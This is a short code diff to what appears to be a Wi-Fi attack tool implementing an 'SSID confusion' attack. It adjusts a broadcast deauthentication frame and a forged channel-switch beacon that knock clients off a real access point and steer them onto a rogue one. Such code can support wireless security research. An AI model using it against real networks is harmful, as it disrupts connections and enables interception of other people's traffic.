@@ -71,7 +71,7 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
     // broadcast deauth so client re-scans
     Dot11Deauthentication deauth(HWAddress<6>::broadcast, HWAddress(ap_bssid));
     deauth.addr3(HWAddress(ap_bssid));
-    deauth.reason_code(3);
+    deauth.reason_code(2); // PREV_AUTH_NOT_VALID -> reset PMKSA
     send_to_real(deauth);
 
     const auto start      = steady_clock::now();
@@ -108,7 +108,7 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
 		if(next_beacon <= steady_clock::now()) {
             send_to_rogue(*confused_beacon);
             RadioTap csa = CSA_attack::get_CSA_beacon(ap.get(SK::mac),
-            	netconfig.real_channel, netconfig.rogue_channel,
+            	netconfig.real_channel, { 6, WifiBand::BAND_2_4, nullopt }, //TODO move client to other random channel to reset PMKSA
             	csa_count, beacon.get());
             send_to_real(csa);
             if(--csa_count < 0) csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
